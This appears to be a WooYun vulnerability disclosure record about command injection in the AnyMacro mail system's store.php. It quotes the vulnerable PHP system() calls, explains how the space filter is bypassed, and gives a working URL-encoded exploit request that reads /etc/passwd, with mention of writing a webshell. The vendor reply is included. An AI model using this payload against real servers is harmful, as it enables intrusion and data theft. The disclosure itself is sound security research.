{"id": 2092, "wybug_id": "wooyun-2014-061216", "wybug_title": "Anymacro 邮件系统多处远程命令注入漏洞（需要登陆）", "wybug_corp": "北京安宁创新网络科技有限公司", "wybug_author": "路人甲", "wybug_date": "2014-05-17 23:56", "wybug_open_date": "2014-08-15 23:58", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-21：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-15：\t细节向公众公开  简要描述：  详细说明：  乌云已经把它列入到通用型奖励厂商当中了。0x01 背景AnyMacro（安宁）成立于1999年，是国内领先的统一消息/移动门户/PushMail产品与应用解决方案提供商。主要客户涵盖国家部委、大型企业以及部分海外客户，客户分布于政府、军工、金融、电信、能源、教育等行业。 AnyMacro在技术创新和关键应用中一直处于行业领先地位，在全球首家提出并实现LAMP架构邮件/消息系统已成为事实的行业标准。AnyMacro 具有统一消息/移动门户/PushMail领域的全线技术与自主知识产权，还是多家国际Linux厂商的OEM邮件/消息产品提供商。0x02 漏洞分析： 由于该邮件系统多处由于调用system()函数，并且由于未做充分考虑。。导致攻击者可以绕过限制，将构造好的命令字符串直接达到命令执行（可写shell,可执行系统命令，可控制整个服务器）。具体分析如下：在根目录下store.php中\n//下载文件或者目录操作的模块….//省略若干代码if ( !empty($_REQUEST['F_down']) ) {\t$result = array();\tif ( !isset($_REQUEST['F_file']) || count($_REQUEST['F_file']) == 0 || strpos($_REQUEST['F_tarname'], ' ') !== false ) {\t\tdieStore_tpl('1', $MSG['VAR_IS_NULL']);\t}\t//得到需要压缩的文件列表\t$file = array();\t$sql  = \"SELECT name FROM indexinfo WHERE id IN (\".implode(\",\", $_REQUEST['F_file']).\")\";\t$rs   = sqlite3_query($sql_id, $sql);\t\tif ( !$rs ) {\t\tdieStore_tpl('1', $MSG['VAR_IS_NULL']);\t}\twhile ( $row = sqlite3_fetch_array($rs) ) {\t\tif ( !file_exists(\"$store_dir/\".$row['name']) ) {\t\t\tcontinue;\t\t}\t\t$file[] = $row['name'];\t}\tsqlite3_query_close($rs);\tif ( count($file) == 0 ) {\t\tdieStore_tpl('1', $MSG['VAR_IS_NULL']);\t}\t\tif ( !empty($_REQUEST['F_type']) ) {\t\t$filestr\t= \"\";\t\t$filestr = \"\\\"\".implode(\"\\\" \\\"\", $file).\"\\\"\";\t\t\t\t$tmpdir \t= $SESSION['maildir'].\"/tmp\";\t\t$filename = urldecode($_REQUEST['F_tarname']);\t\tif ( $_REQUEST['F_type']\t== 'zip' ) {\t\t\tsystem(\"cd $store_dir; zip -r \\\"$tmpdir/$filename\\\" $filestr 2>&1 > /dev/null\");\t//\t\theader(\"Content-Type: application/zip\");\t\t} else if ( $_REQUEST['F_type'] == 'tgz' ) {\t\t\tsystem(\"tar cfz \\\"$tmpdir/$filename\\\" -C \\\"$store_dir\\\" $filestr 2>/dev/null\");\t//\t\theader(\"Content-Type: application/x-tar\");\t//\t\theader(\"Content-Encoding: gzip\");\t\t} else if ( $_REQUEST['F_type'] == 'tar' ) {\t\t\tsystem(\"tar cf \\\"$tmpdir/$filename\\\" -C \\\"$store_dir\\\" $filestr 2>/dev/null \");\t//\t\theader(\"Content-Type: application/x-tar\");\t\t} else if ( $_REQUEST['F_type'] == 'bz2' ) {\t\t\tsystem(\"tar cfj \\\"$tmpdir/$filename\\\" -C \\\"$store_dir\\\" $filestr 2>/dev/null \");…..//省略若干代码\n其中\nif ( !empty($_REQUEST['F_down']) ) { //当变量F_down不为空的情况下，可设置为1\t$result = array();\tif ( !isset($_REQUEST['F_file']) || count($_REQUEST['F_file']) == 0 || strpos($_REQUEST['F_tarname'], '  ') !== false ) { // F_file不为空，并且为数组。。这里的$_REQUEST['F_tarname']为绕过的关键，他里面必须不能带空格。\t\tdieStore_tpl('1', $MSG['VAR_IS_NULL']);\t}\n接下来分析\n$filename = urldecode($_REQUEST['F_tarname']);  //这里url解码一下\t\tif ( $_REQUEST['F_type']\t== 'zip' ) {\t\t\tsystem(\"cd $store_dir; zip -r \\\"$tmpdir/$filename\\\" $filestr 2>&1 > /dev/null\");\t//\t\theader(\"Content-Type: application/zip\");\t\t} else if ( $_REQUEST['F_type'] == 'tgz' ) {\t\t\tsystem(\"tar cfz \\\"$tmpdir/$filename\\\" -C \\\"$store_dir\\\" $filestr 2>/dev/null\"); //漏洞点  其中$filename是可控的。。 $tmpdir为之前配置好的，无需关注。所以这里将可命令注入漏洞\t//\t\theader(\"Content-Type: application/x-tar\");\n0x03 exploit分析Exploit构造，前面我们可知$_REQUEST['F_tarname'] 可控，（但是需要注意的是前面空格做了限制）我们可以构造如下攻击包。。。store.php?F_sid=9ead95a11698fb7a1302dbbc6d730ad1&F_down=1&F_tarname=fuck.tar\" /etc/passwd |echo 13111 > /tmp/test.txt||\"但是前面我们提过，不能要空格，有什么方法绕过呢？。。。。其实+可以替代我们的空格的，顾我们可以绕过，直接执行系统命令了。。如fuck.tar\"+/etc/passwd+|cat+/etc/passwd+>+/tmp/test.txt||\"然后urlencode一下/store.php?F_sid=9ead95a11698fb7a1302dbbc6d730ad1&F_down=1&F_tarname=fuck.tar%22%2B%2Fetc%2Fpasswd%2B%7Ccat%2B%2Fetc%2Fpasswd%2B%3E%2B%2Ftmp%2Ftest.txt%7C%7C%22&F_type=tgz&F_file[]=即可将passwd 写到/tmp/目录下test.txt中\n\n\n\n然后写shell了\n\n其中在simple/store.php同样存在该问题\nif ( !empty($_REQUEST['F_type']) ) {\t\t$filestr\t= \"\";\t\t$filestr = \"\\\"\".implode(\"\\\" \\\"\", $file).\"\\\"\";\t\t\t\t$tmpdir \t= $SESSION['maildir'].\"/tmp\";\t\t$filename = urldecode($_REQUEST['F_tarname']);\t\tif ( $_REQUEST['F_type']\t== 'zip' ) {\t\t\tsystem(\"cd $store_dir; zip -r \\\"$tmpdir/$filename\\\" $filestr 2>&1 > /dev/null\");\t//\t\theader(\"Content-Type: application/zip\");\t\t} else if ( $_REQUEST['F_type'] == 'tgz' ) {\t\t\tsystem(\"tar cfz \\\"$tmpdir/$filename\\\" -C \\\"$store_dir\\\" $filestr 2>/dev/null\");\t//\t\theader(\"Content-Type: application/x-tar\");\t//\t\theader(\"Content-Encoding: gzip\");\t\t} else if ( $_REQUEST['F_type'] == 'tar' ) {\t\t\tsystem(\"tar cf \\\"$tmpdir/$filename\\\" -C \\\"$store_dir\\\" $filestr 2>/dev/null \");\t//\t\theader(\"Content-Type: application/x-tar\");\t\t} else if ( $_REQUEST['F_type'] == 'bz2' ) {\t\t\tsystem(\"tar cfj \\\"$tmpdir/$filename\\\" -C \\\"$store_dir\\\" $filestr 2>/dev/null \");\t//\t\theader(\"Content-Type: application/x-bzip2\");\t\t} else {\t\t\tdieStore_tpl('1', $MSG['NOT_COMPRESS_FORMAT']);\t\t}\n   漏洞证明：  \n\n然后写shell了\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-05-18 13:24 厂商回复： 此版本为我公司G6版本，现在使用比较少。已经推出升级包，联系用户升级处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}